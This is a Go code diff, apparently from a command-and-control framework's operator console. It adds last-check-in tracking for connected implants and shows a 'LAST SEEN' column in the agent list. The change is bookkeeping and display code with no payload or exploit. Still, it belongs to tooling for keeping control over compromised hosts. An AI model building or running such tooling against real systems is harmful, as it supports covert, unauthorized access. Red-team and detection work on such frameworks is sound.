@@ -47,6 +47,7 @@ type ClientInfo struct {
 	OS          string
 	User        string
 	ConnectedAt string
+	LastCheckin  time.Time
 	PID         int
 	SessionID   string
 	Alias       string
@@ -576,7 +577,7 @@ func (op *Operator) printAgents() {
 		return
 	}
 	fmt.Printf("\n  %-10s %-10s %-14s %-16s %-10s %s\n",
-		"NAME", "ID", "OS", "HOSTNAME", "USER", "CONNECTED")
+		"NAME", "ID", "OS", "HOSTNAME", "USER", "LAST SEEN")
 	fmt.Printf("  %-10s %-10s %-14s %-16s %-10s %s\n",
 		"----------", "----------", "--------------", "----------------",
 		"----------", "-------------------")
@@ -585,9 +586,12 @@ func (op *Operator) printAgents() {
 		if cid == op.attachedClient {
 			marker = "\033[32m> \033[0m"
 		}
+		ago := time.Since(info.LastCheckin).Truncate(time.Second)
+		lastSeen := fmt.Sprintf("%s (%s ago)",
+			info.LastCheckin.Format("15:04:05"), ago)
 		fmt.Printf("%s\033[1m%-10s\033[0m %-10s %-14s %-16s %-10s %s\n",
 			marker, info.Alias, cid[:8], info.OS,
-			info.Hostname, info.User, info.ConnectedAt)
+			info.Hostname, info.User, lastSeen)
 	}
 	fmt.Println()
 }
@@ -874,10 +878,12 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 	user, _ := info["user"].(string)
 	sessionID, _ := info["session_id"].(string)
 
-	// If already known with same session, skip (duplicate heartbeat)
+	// If already known with same session, update last checkin time
 	if existing, exists := op.connectedClients[clientID]; exists {
 		if existing.SessionID == sessionID {
-			return // same session, already connected
+			existing.LastCheckin = time.Now()
+			op.connectedClients[clientID] = existing
+			return
 		}
 		// Different session — agent reconnected, update and re-negotiate
 		fmt.Printf("\n\033[36m[*] Implant %s reconnected (new session)\033[0m\n",
@@ -900,6 +906,7 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		OS:          osInfo,
 		User:        user,
 		ConnectedAt: timestamp,
+		LastCheckin:  time.Now(),
 		PID:         pid,
 		SessionID:   sessionID,
 		Alias:       alias,
